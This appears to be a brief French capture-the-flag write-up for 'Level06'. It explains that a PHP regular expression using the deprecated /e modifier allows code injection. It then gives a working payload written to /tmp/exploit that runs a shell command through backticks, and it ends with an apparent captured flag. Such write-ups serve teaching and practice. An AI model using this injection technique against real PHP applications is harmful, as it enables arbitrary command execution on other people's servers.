
 ## Level06:

 Dans le code fournit dans level06.php on remarque  une expression reguliere qui utilise /e qui signifie all.   
 Cette expression est deprecated car on peut y faire des injections de code.   
 C'est ce qu'on va faire.  
 Pour cela on doit utiliser l'expression reguliere qui utilise /e  donc notre fichier doit contenir ```[x {commmand here}]```
https://wiki.php.net/rfc/remove_preg_replace_eval_modifier
```echo '[x {${`/bin/bash -c "/bin/getflag"`}}]' > /tmp/exploit```
then ```./level06 /tmp/exploit```

wiok45aaoguiboiki2tuin6ub